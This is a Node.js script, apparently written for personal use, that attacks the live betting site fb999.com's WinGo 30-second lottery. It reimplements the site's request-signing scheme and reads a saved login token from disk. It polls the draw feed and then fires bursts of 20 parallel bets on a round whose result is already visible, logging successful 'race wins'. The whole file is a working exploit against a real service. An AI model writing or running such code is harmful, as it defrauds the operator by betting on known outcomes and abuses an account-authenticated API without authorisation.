#!/usr/bin/env node
/**
 * WinGo_30S — Race Condition Exploiter v3
 *
 * Key discoveries:
 * - Frontend calls: POST /Lottery/WinGoBet (on fb999api.com)
 * - Frontend params: { gameCode, issueNumber, amount, betMultiple, betContent }
 * - betContent format: `${playType}_${titleCase(playBet)}`
 *   e.g., "BigSmall_Big", "BigSmall_Small", "Color_Green", "Color_Red", "Color_Violet", "Num_0"..."Num_9"
 * - Server endpoint also accepts: POST /api/webapi/GameBetting with { TypeId, BetCount, Amount, SelectType }
 *
 * The frontend endpoint (/Lottery/WinGoBet) is the most likely to work as it's
 * what the actual Vue app uses.
 *
 * Race Window: Result appears ~2.4-3s before the round that generated it ends.
 * We need to detect this and place bets before the server closes betting.
 */

const https = require('https');
const crypto = require('crypto');
const fs = require('fs');

// Load fresh JWT
const loginData = JSON.parse(fs.readFileSync('/tmp/fb999_login_response.json', 'utf8'));
const JWT = loginData.data.token;

console.log('=== WinGo_30S — Race Condition Exploiter v3 ===\n');
console.log('JWT loaded:', JWT ? 'YES' : 'NO');

// === API Signing ===
function ne() { return crypto.randomBytes(16).toString('hex'); }
function we(str) { return crypto.createHash('md5').update(str).digest('hex').toUpperCase().slice(0, 32); }

function signParams(params) {
  const u = { ...params, language: 0 };
  u.random = ne();
  const c = JSON.parse(JSON.stringify(u));
  const o = Object.keys(c).filter(key =>
    !(typeof c[key] === 'object' && c[key] !== null && !Array.isArray(c[key])) && !Array.isArray(c[key]));
  o.sort();
  const i = {};
  o.forEach(key => { if (c[key] !== null && c[key] !== "" && c[key] !== undefined) i[key] = c[key] === 0 ? 0 : c[key]; });
  u.signature = we(JSON.stringify(i));
  u.timestamp = Math.floor(Date.now() / 1e3);
  return u;
}

function httpsPost(hostname, path, body, extraHeaders = {}) {
  return new Promise((resolve, reject) => {
    const headers = {
      'Content-Type': 'application/json',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
      'Referer': 'https://fb999.com/',
      'Origin': 'https://fb999.com',
      'ar-origin': 'https://fb999.com',
      ...extraHeaders
    };
    headers['Content-Length'] = Buffer.byteLength(body);
    
    const req = https.request({ hostname, path, method: 'POST', headers, timeout: 8000 }, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => resolve({ status: res.statusCode, body: data, headers: res.headers }));
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
    req.write(body);
    req.end();
  });
}

function httpsGet(hostname, path) {
  return new Promise((resolve, reject) => {
    const req = https.request({ hostname, path, method: 'GET' }, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
    req.end();
  });
}

function classify(n) {
  n = parseInt(n);
  if (n === 0) return 'violet';
  if (n >= 5) return 'big';
  return 'small';
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// === Bet Placement Functions ===

// Method 1: Frontend API format (POST /Lottery/WinGoBet)
async function placeBetFrontend(issueNumber, SelectType, amount = 1) {
  // Map SelectType to betContent format
  let betContent;
  switch(SelectType) {
    case 'big': betContent = 'BigSmall_Big'; break;
    case 'small': betContent = 'BigSmall_Small'; break;
    case 'red': betContent = 'Color_Red'; break;
    case 'green': betContent = 'Color_Green'; break;
    case 'violet': betContent = 'Color_Violet'; break;
    case 'odd': betContent = 'BigSmall_Odd'; break; // may not be valid
    case 'even': betContent = 'BigSmall_Even'; break; // may not be valid
    default: betContent = SelectType;
  }
  
  const body = JSON.stringify(signParams({
    TypeId: 30,
    lottery: 'WinGo',
    gameCode: 'WinGo_30S',
    issueNumber: issueNumber,
    amount: amount,
    betMultiple: 1,
    betContent: betContent
  }));
  
  return await httpsPost('fb999api.com', '/api/webapi/Lottery/WinGoBet', body, {
    'Authorization': `Bearer ${JWT}`,
    'Cookie': `ar_token=${JWT}`
  });
}

// Method 2: Server API format (POST /api/webapi/GameBetting)
async function placeBetServer(issueNumber, SelectType, BetCount = 1, Amount = 1) {
  const body = JSON.stringify(signParams({
    TypeId: 30,
    lottery: 'WinGo',
    gameCode: 'WinGo_30S',
    issueNumber: issueNumber,
    BetCount: BetCount,
    Amount: Amount,
    SelectType: SelectType
  }));
  
  return await httpsPost('fb999api.com', '/api/webapi/GameBetting', body, {
    'Authorization': `Bearer ${JWT}`,
    'Cookie': `ar_token=${JWT}`
  });
}

// === Phase 1: Test bet format ===
async function testBetFormat() {
  console.log('--- Phase 1: Testing Bet Formats ---\n');
  
  // Get current issue
  const config = JSON.parse((await httpsGet('draw.ar-lottery06.com', '/WinGo/WinGo_30S.json')).body);
  const currentIssue = config.current.issueNumber;
  console.log(`Current issue: ${currentIssue}\n`);
  
  // Test both formats with 'big' bet type
  const formats = [
    { name: 'Frontend format (/Lottery/WinGoBet)', 
      fn: () => placeBetFrontend(currentIssue, 'big', 1) },
    { name: 'Server format (/api/webapi/GameBetting)', 
      fn: () => placeBetServer(currentIssue, 'big', 1, 1) },
  ];
  
  for (const format of formats) {
    console.log(`[${format.name}]`);
    try {
      const res = await format.fn();
      console.log(`  Status: ${res.status}`);
      console.log(`  Response: ${res.body.substring(0, 400)}`);
      
      try {
        const json = JSON.parse(res.body);
        console.log(`  Parsed: code=${json.code}, msg=${json.msg || 'N/A'}`);
        if (json.code === 0) {
          console.log(`  *** SUCCESS! Bet format confirmed! ***`);
          fs.appendFileSync('/tmp/wingo_bet_format_success.json',
            JSON.stringify({ format: format.name, response: json, timestamp: new Date().toISOString() }, null, 2) + '\n');
        }
      } catch (e) {
        console.log(`  Non-JSON`);
      }
    } catch (e) {
      console.log(`  Error: ${e.message}`);
    }
    console.log('');
    await sleep(100);
  }
}

// === Phase 2: Race Condition Monitor ===
async function raceMonitor() {
  console.log('--- Phase 2: Race Condition Monitoring ---\n');
  
  let lastDetected = '';
  let raceAttempts = 0;
  const MAX_RACES = 5;
  
  // Track result close times using GetGameIssue
  let lastEndTime = 0;
  
  while (raceAttempts < MAX_RACES) {
    try {
      // Get current config
      const config = JSON.parse((await httpsGet('draw.ar-lottery06.com', '/WinGo/WinGo_30S.json')).body);
      const currentEnd = config.current.endTime;
      const currentTimeEnd = new Date(currentEnd).getTime();
      
      // Get history - the result that appears here is for the JUST-closed round
      const histRes = await httpsGet('draw.ar-lottery06.com',
        '/WinGo/WinGo_30S/GetHistoryIssuePage.json?pageNo=1&pageSize=10');
      const list = JSON.parse(histRes.body).data?.list || [];
      
      if (list.length > 0 && list[0].issueNumber !== lastDetected) {
        lastDetected = list[0].issueNumber;
        const detected = list[0];
        const resultNum = detected.number;
        const resultCat = classify(resultNum);
        const now = Date.now();
        
        // The detected result is for the round that just CLOSED
        // If the current round's endTime is in the future, we're still in it
        // If the result appeared while currentEnd is ~2.4s+ before close,
        // that means we saw the result before the CURRENT round closes
        // which is what the "race" is about
        
        const msToCurrentClose = currentTimeEnd - now;
        
        console.log(`[${new Date().toLocaleTimeString()}] Result: ${resultNum} (${resultCat}) issue=${detected.issueNumber}`);
        console.log(`  Time to current round close: ${msToCurrentClose}ms`);
        console.log(`  Current issue: ${config.current.issueNumber}`);
        
        // If result appears while the current round is still counting down,
        // we can race to bet on it (the result is for the PREVIOUS round)
        if (msToCurrentClose > 5000) {
          // Result appeared well before current round closes
          // This is the race window - bet on the just-seen result
          console.log(`  ⚡ Race window: Result detected ${Math.round(msToCurrentClose/1000)}s before current round closes`);
          console.log(`  Placing rapid bets on ${resultCat} (${resultNum})...\n`);
          raceAttempts++;
          
          // Rapid fire bets
          const betPromises = [];
          for (let i = 0; i < 20; i++) {
            // Try server format
            betPromises.push(placeBetServer(detected.issueNumber, resultCat, 1, 1).catch(e => ({ error: e.message })));
          }
          
          const results = await Promise.allSettled(betPromises);
          let success = 0, fail = 0;
          
          results.forEach((r, i) => {
            if (r.status === 'fulfilled') {
              try {
                const json = JSON.parse(r.value.body);
                if (json.code === 0) {
                  success++;
                  console.log(`  ✅ Bet ${i+1}: code=0 msg=${json.msg || 'N/A'}`);
                } else {
                  fail++;
                  if (i < 3) console.log(`  ❌ Bet ${i+1}: code=${json.code} msg=${(json.msg||'').substring(0, 80)}`);
                }
              } catch (e) {
                fail++;
              }
            } else {
              fail++;
            }
          });
          
          console.log(`\n  Race ${raceAttempts}: ${success} successes / ${fail} failures\n`);
          
          if (success > 0) {
            fs.appendFileSync('/tmp/wingo_race_wins.txt',
              `[${new Date().toISOString()}] RACE SUCCESS: ${success} bets accepted | issue=${detected.issueNumber} | result=${resultNum} (${resultCat})\n`);
          }
        } else {
          console.log(`  Not in race window (too close to close)\n`);
        }
      }
      
      await sleep(50);
      
    } catch (e) {
      console.log(`Error: ${e.message}`);
      await sleep(500);
    }
  }
  
  console.log('\n=== Race Monitoring Complete ===');
  console.log(`Race attempts: ${raceAttempts}`);
}

// === Main ===
(async () => {
  if (!JWT) {
    console.error('ERROR: No JWT token available.');
    process.exit(1);
  }
  
  await testBetFormat();
  await raceMonitor();
  
  console.log('\nDone.');
})();
